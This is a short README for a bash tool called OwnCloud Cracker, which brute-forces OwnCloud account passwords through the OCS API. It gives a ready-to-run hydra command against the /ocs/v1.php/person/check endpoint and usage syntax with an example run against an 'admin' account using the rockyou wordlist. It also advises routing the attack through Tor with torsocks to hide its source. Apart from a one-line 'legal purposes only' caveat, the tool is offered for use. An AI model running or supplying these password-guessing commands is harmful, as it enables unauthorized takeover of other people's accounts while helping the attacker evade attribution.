=====
OwnCloud Cracker

Bruteforce OwnCloud accounts using it's API. Yes, in bash!

You can also use hydra if available:
hydra 127.0.0.1 -L userlist.txt -P pass.txt "/ocs/v1.php/person/check:login=^USER^&password=^PASS^"

Get help with the "-h" switch: ./ocrk.sh -h

Before run, it's more convinient to make it executable: chmod +x ocrk.sh
Else you need to run like "sh ocrk.sh"

Syntax: ./ocrk.sh <site url> <username> <passwordlist>
Example: ./orck.sh https://www.crkoc.com/ admin rockyou.txt

You can use this over Tor, but the "torify" command is not recommended. Use ". torsocks on" before running.

For legal purposes only.
